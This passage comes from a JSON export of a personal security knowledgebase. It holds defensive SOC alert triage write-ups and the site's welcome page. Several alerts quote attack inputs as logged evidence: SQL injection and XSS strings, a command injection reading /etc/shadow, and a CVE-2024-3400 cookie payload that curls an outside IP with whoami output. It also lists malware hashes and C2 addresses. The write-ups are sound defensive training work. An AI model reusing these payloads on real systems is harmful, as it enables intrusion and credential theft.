or url and contains valid subject.\nAnalyzing logs, there is no communication with any suspicious addresses.\nReport\nThe alert is False Positive. The email contain no harmful attachment or url. Hosts seem normal. The cause of false positive needs further investigation."},"Writeups/SOC-Alerts/SOC138":{"slug":"Writeups/SOC-Alerts/SOC138","filePath":"Writeups/SOC Alerts/SOC138.md","title":"SOC138","links":[],"tags":[],"content":"Alert\n\nEventID: 77\nEvent Time: Mar, 13, 2021, 08:20 PM\nRule: SOC138 - Detected Suspicious Xls File\nLevel: Security Analyst\nSource Address: 172.16.17.56\nSource Hostname: Sofia\nFile Name: ORDER SHEET &amp; SPEC.xlsm\nFile Hash: 7ccf88c0bbe3b29bf19d877c4596a8d4\nFile Size: 2.66 Mb\nDevice Action: Allowed\nFile: Download  (Password:infected)\n\nAnalysis\nMalware Analysis\n1. Virustotal\n\nURL:www.virustotal.com/gui/file/7bcd31bd41686c32663c7cabf42b18c50399e3b3b4533fc2ff002d9f2e058813\nReport:\n\n***Malicious\nCve-2017-11882\nUses heavily obfuscated code to execute commands and drop files.\nConnections:\n\nTCP 204.79.197.203:443\nTCP 209.85.200.94:443\nTCP 177.53.143.89:443 (multiwaretecnologia.com.br)\nTCP 52.114.76.35:443\nTCP 172.217.17.142:443 (drive.google.com)\nTCP 185.157.161.61:52360 (wealthybillionaire.ddns.net)\n\n\n\n\n\n2. AnyRun\n\nURL: app.any.run/tasks/a4bc64cb-aac8-49d4-a451-bcf37a702508\nReport:\n\nConnections\n\n52.109.32.97\n20.74.47.205\n20.223.35.26\n4.245.163.56\n\n\nReport\n\nThe file is corroupted. Didn’t access any malicious ips. The contacted addresses above are legit microsoft addresses.\n\n\n\n\n\nLogs &amp; C2\nOn checking logs, the host has accessed one of the malicious ips, 177.53.143.89. The host has been compromised.\nEndpoint\nThere  is a malicious powershell command which ran a obfuscated code. The host was contained immediately.\nReport\nThe phishing file has infected the host. The logs indicates that connection to C2 server has been made. Further, there is a malicious code executed in powershell. The hos has been contiained for now and needs further investigation."},"Writeups/SOC-Alerts/SOC145":{"slug":"Writeups/SOC-Alerts/SOC145","filePath":"Writeups/SOC Alerts/SOC145.md","title":"SOC145","links":[],"tags":[],"content":"Alert\n\nEventID: 92\nEvent Time: May, 23, 2021, 07:32 PM\nRule: SOC145 - Ransomware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.88\nSource Hostname: MarkPRD\nFile Name: ab.exe\nFile Hash: 0b486fe0503524cfe4726a4022fa6a68\nFile Size: 775.50 Kb\nDevice Action: Allowed\nFile (Password: infected): Download\n\nAnalysis\nMalware Analysis\n1. Virustotal\n\nURL: www.virustotal.com/gui/file/1228d0f04f0ba82569fc1c0609f9fd6c377a91b9ea44c1e7f9f84b2b90552da2\nReport:\n\nMalicious. 61 vendors detected it as ransomware.\n\n\n\n2. Anyrun\n\nURL: app.any.run/tasks/7cf5c2e9-e692-4d77-b87c-4f565a3c2ed4\nReport:\n\nConnections:\n\n192.168.100.1\n\n\nExtracted URLS:\n\nwww.torproject.org\nWe are unable to find any C2 addresses. Maybe the malware is using VM evading techniques.\n\n\n\n\n\nLogs &amp; C2\nChecking logs to see if any sus connections were made by the host after the malware was detected. There are no sus connections. We can assume that the the connection was not made.\nEndpoint\nThe endpoint has ab.exe running. The host has been compromised. Contained the host immediately.\nReport\nThe host system was compromised by ransomware identified as ab.exe. No immediate communication with Command and Control (C2) servers was detected. However, due to the nature of the malware and its potential for evasion techniques, immediate containment was done and further detailed analysis of the host is required to prevent any potential spread or additional compromise."},"Writeups/SOC-Alerts/SOC146":{"slug":"Writeups/SOC-Alerts/SOC146","filePath":"Writeups/SOC Alerts/SOC146.md","title":"SOC146","links":["phishing"],"tags":[],"content":"Alert\n⭐ This alert was generated from a real phishing attack.\n\nEventID : 93\nEvent Time : Jun, 13, 2021, 02:13 PM\nRule : SOC146 - Phishing Mail Detected - Excel 4.0 Macros\nLevel : Security Analyst\nSMTP Address : 24.213.228.54\nSource Address : trenton@tritowncomputers.com\nDestination Address : lars@letsdefend.io\nE-mail Subject : RE: Meeting Notes\nDevice Action : Allowed\nAttachment : 11f44531fb088d31307d87b01e8eabff\n\nPassword: infected\n\n\n\nAnalysis\n\nVirustotal Results:\n\nAttachment: 32/66\nDomain: 0/94\nIP Address: 0/94\n\n\nEmail Delivered: True\nAttachment Opened: False\n\nReport\nA malicious zip file was sent to lars@letsdefend.io by trenton@tritowncomputers.com on June 13 2021. The file contained a infected excel macro. The email was delivered using 24.213.228.54 server and successfully entered user’s inbox. The email contents were not downloaded by the user and hence the phishing attack was unsuccessful."},"Writeups/SOC-Alerts/SOC165":{"slug":"Writeups/SOC-Alerts/SOC165","filePath":"Writeups/SOC Alerts/SOC165.md","title":"SOC165","links":["SOC/SQL-Injection"],"tags":[],"content":"Alert\n\nEventID : 115\nEvent Time : Feb, 25, 2022, 11:34 AM\nRule : SOC165 - Possible SQL Injection Payload Detected\nLevel : Security Analyst\nHostname : WebServer1001\nDestination IP Address : 172.16.17.18\nSource IP Address : 167.99.169.17\nHTTP Request Method : GET\nRequested URL : https://172.16.17.18/search/?q=%22%20OR%201%20%3D%201%20—%20-\nUser-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nAlert Trigger Reason : Requested URL Contains OR 1 = 1\nDevice Action : Allowed\n\nAnalysis\n\nDecoded URL : https://172.16.17.18/search/?q=” OR 1 = 1 — -\nThe traffic is coming from outside (Internet);\nAbuseipdb report:\n\nISP: DigitalOcean, LLC\nUsage Type: Data Center/Web Hosting/Transit\nASN: AS14061\nDomain Name: digitalocean.com\nCountry: United States of America\n\n\nOverall the reputation of ip is mostly neutral.\nSuccess?\n\nThe response size is small and same.\nThere is no sign of host being pawned.\nUnsuccessful → No escalation\n\n\n\nReport\nOn Feb, 25, 2022, 11:34 AM, an unknown ip 167.99.169.17 attempted SQL Injection on 172.16.17.18. There was a single attempt done by the adversary in which the url  https://172.16.17.18/search was targeted. The host WebServer1001 was not breached and the attempt was Unsuccessful. There was no sign of the ip address in future and no furthur attempts were made by the adversary. The alert was True Positive."},"Writeups/SOC-Alerts/SOC166":{"slug":"Writeups/SOC-Alerts/SOC166","filePath":"Writeups/SOC Alerts/SOC166.md","title":"SOC166","links":["Assets/0466d09e1d8c22825726596287172d35_MD5.jpeg","SOC/XSS-Attack","HTB/http-response-code"],"tags":[],"content":"Alert\n\nEventID : 116\nEvent Time : Feb, 26, 2022, 06:56 PM\nRule : SOC166 - Javascript Code Detected in Requested URL\nLevel : Security Analyst\nHostname : WebServer1002\nDestination IP Address : 172.16.17.17\nSource IP Address : 112.85.42.13\nHTTP Request Method : GET\nRequested URL : https://172.16.17.17/search/?q=&lt;script&gt;javascript:alert(1)&lt;$/script&gt;\nUser-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nAlert Trigger Reason : Javascript code detected in URL\nDevice Action : Allowed\n\nAnalysis\nIP Address\nOpen: Pasted image 20250216205216.png\n\nReputation looks good.\nLogs\nThe attacker tried several XSS Attack on /search/?q= parameter. The network traffic was permitted by the firewall but the http response code was 302 which means that the attack was unsuccessful. The user-agent of attacker was Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nEndpoint\nNo signs of malicious activity on the host"},"Writeups/SOC-Alerts/SOC167":{"slug":"Writeups/SOC-Alerts/SOC167","filePath":"Writeups/SOC Alerts/SOC167.md","title":"SOC167","links":["Assets/8097dabb15a61263702e88959dbe7bf9_MD5.jpeg"],"tags":[],"content":"Alert\n\nEventID: 117\nEvent Time: Feb 27, 2022, 12:36 AM\nRule: SOC167 - LS Command Detected in Requested URL\nLevel: Security Analyst\nHostname: EliotPRD\nDestination IP Address: 188.114.96.15\nSource IP Address: 172.16.17.46\nHTTP Request Method: GET\nRequested URL: letsdefend.io/blog/\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0\nAlert Trigger Reason: URL Contains LS\nDevice Action: Allowed\n\nAnalysis\nIP Address\nSource\nThe source is from the company network. Checking the host endpoint for details. The endpoint seems intact and no malicious activity is seen. The host did contact the destination server.\nDestination\nOpen: Pasted image 20250216211945.png\n\nSAFE\n_What is going on here?\nLogs\nThe destination server actually hosts company website. There is nothing sus.\nConclusion\nI am dumb. This is a False Positive. The ls command was mistakenly taken from the word skills."},"Writeups/SOC-Alerts/SOC168":{"slug":"Writeups/SOC-Alerts/SOC168","filePath":"Writeups/SOC Alerts/SOC168.md","title":"SOC168","links":["Assets/36930092e18696e5a6839d2fb09dedcb_MD5.jpeg","SOC/Command-Injection","HTB/http-response-code"],"tags":[],"content":"Alert\n\nEventID: 118\nEvent Time: Feb 28, 2022, 04:12 AM\nRule: SOC168 - Whoami Command Detected in Request Body\nLevel: Security Analyst\nHostname: WebServer1004\nDestination IP Address: 172.16.17.16\nSource IP Address: 61.177.172.87\nHTTP Request Method: POST\nRequested URL: https://172.16.17.16/video/\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nAlert Trigger Reason: Request Body Contains whoami string\nDevice Action: Allowed\n\nAnalysis\nIP Address\nOpen: Pasted image 20250216210628.png\n\nsus\nLogs\nOh no! There are multiple attempts of Command Injection in POST Parameter : ?c=cat /etc/shadow. The response sizes vary and http response code are 200. The attack was successful. Also, the attacker user-agent is Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nEndpoint\nCommand history confirms that the attack was successful. There are instances of commands run by the attacker. The endpoint was contained immediately."},"Writeups/SOC-Alerts/SOC169":{"slug":"Writeups/SOC-Alerts/SOC169","filePath":"Writeups/SOC Alerts/SOC169.md","title":"SOC169","links":["Assets/84b812c00a42d636ad1702fcb1da08bb_MD5.jpeg"],"tags":[],"content":"Alert\n\nEventID : 119\nEvent Time : Feb, 28, 2022, 10:48 PM\nRule : SOC169 - Possible IDOR Attack Detected\nLevel : Security Analyst\nHostname : WebServer1005\nDestination IP Address : 172.16.17.15\nSource IP Address : 134.209.118.137\nHTTP Request Method : POST\nRequested URL : https://172.16.17.15/get_user_info/\nUser-Agent : Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\nAlert Trigger Reason : consecutive requests to the same page\nDevice Action : Allowed\n\nAnalysis\nIP Address Analysis\nOpen: Pasted image 20250215184003.png\n\nIP Address is not malicious and was not seen earlier and ever after.\nAttack Analysis\nThe adversary tried to exploit ?user_id= parameter and access other user’s info. The response sizes are different and response code was 200. The IDOR attack was successful. Requested server containment.\nReport\nIDOR Attack was performed on WebServer1005 by 134.209.118.137. The attacker was successful in gaining hands on userdata by exploiting ?user_id= parameter. The exploit needs immediate patching. The webserver has been contained."},"Writeups/SOC-Alerts/SOC274":{"slug":"Writeups/SOC-Alerts/SOC274","filePath":"Writeups/SOC Alerts/SOC274.md","title":"SOC274","links":[],"tags":[],"content":"Alert\n⭐ A critical command injection vulnerability has been identified in Palo Alto Networks PAN-OS software\n\nEventID: 249\nEvent Time: Apr, 18, 2024, 03:09 AM\nRule: SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)\nLevel: Security Analyst\nHostname: PA-Firewall-01\nDestination IP Address: 172.16.17.139\nSource IP Address: 144.172.79.92\nHTTP Request Method: POST\nRequested URL: 172.16.17.139/global-protect/login.esp\ncookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl{IFS}144.172.79.92:4444?user=(whoami)\nAlert Trigger Reason: Characteristics exploit pattern Detected on Cookie and Request, indicative exploitation of the CVE-2024-3400.\nDevice Action: Allowed\n\n\nAnalysis\nThis alert is due to a command injection attempt.\nIP Reputation\nThe source ip is outside of our network. Checking its reputation,\nAcc to Virustotal Report, the ip address is malicious flagged by 13/94 vendors.\n\nNetwork: 144.172.79.0/24\nAutonomous System Number: 14956\nAutonomous System Label: ROUTERHOSTING\nRegional Internet Registry: ARIN\nCountry: US\n\nAcc to Threat Intel too, the ip is malicious\nLogs\nLOGFILE: /var/log/nginx/sslvpn_access.log\n \n[18/Apr/2024:15:09:42 +0000]: 144.172.79.92 51232 - 172.16.17.139 20077 [18/Apr/2024:15:09:42 +0000] &quot;POST /global-protect/logout.esp HTTP/1.1&quot; 200 4406 &quot;-&quot; &quot;curl/8.4.0&quot; 1713261211.617 0.002 0.002 987\n \n[18/Apr/2024:15:09:42 +0000] : 127.0.0.1 57108 - 127.0.0.1 20077 [18/Apr/2024:15:09:42 +0000] &quot;GET /sslvpn_ngx_status HTTP/1.1&quot; 200 103 &quot;-&quot; &quot;Wget/1.19.5 (linux-gnu)&quot; 1713261243.774 0.000 - 989\n \n[18/Apr/2024:15:09:42 +0000] : 144.172.79.92 51275 - 172.16.17.139 20077 [18/Apr/2024:15:09:42 +0000] &quot;POST /global-protect/login.esp HTTP/1.1&quot; 200 11364 &quot;-&quot; &quot;curl/8.4.0&quot; 1713261264.522 0.002 0.002 991\nThe final command indicates that the post command was successful. Checking if the endpoint actually ran it to confirm, the endpoint network activity shows that the endpoint has contacted the ip but there is no command history log available for endpoint. Checking all the processes running on the endpoint,  there is a python script (update.py or sth) running. Checking the image hash in virustotal, it is malicious and tied to the CVE-2024-3400 vulnerability.\nHence, we can concluded that the endpoint has been compromised and request tier 2 escalation."},"index":{"slug":"index","filePath":"index.md","title":"Welcome to my Knowledgebase","links":["HTB","Malware-Analysis/Malware-Analysis","Networking","Writeups","SOC/!-SOC-Learning-Pathway","AI/Foundations-of-AI"],"tags":[],"content":"👋 Hi there! Welcome to my digital knowledgebase.\nThis is where I document my notes, methodologies, and experiments as I learn new things. Think of it as my personal wiki, constantly evolving with me.\n\n🌱 What’s Here?\nThis knowledge base is organized into a few key areas:\n🎯 Hack The Box (HTB)\nNotes from HTB Academy . A step-by-step breakdown of various topics, especially offensive and general purpose materials.\n🛡️Malware Analysis\nThis topic covers basics of malware analysis, malicious document analysis and reverse engineering concepts.\n🌐 Networking\nA deep dive into networking concepts, protocols, and tools. From the basics to advanced topics, this is where I document my understanding of how networks work.\n📝 Writeups\nA detailed walkthrough of machines I’ve pwned (not many yet, but growing), alert analysis, malware analysis. This is where my reports exist.\n🔒 Security Operations Center (SOC)\nNotes and insights about SOC workflows, tools, and techniques. This section is all about understanding how security teams operate and respond to threats. Great for beginners like me.\n🤖 AI\nExplorations into artificial intelligence concepts, algorithms, and applications. This is where I document my journey into the world of AI and machine learning.\n\n📌 Why This Exists\nThis knowledge base is my way of:\n\nOrganizing what I learn.\nSharing insights and resources with others.\nTracking my progress over time.\n\nIt’s not perfect, but it’s honest and always growing.\n\nThanks for stopping by! If you find something useful or want to chat, feel free to reach out.\n\nDo not run any downloaded file in main system. Use a VM and you are responsible for your actions not me."}}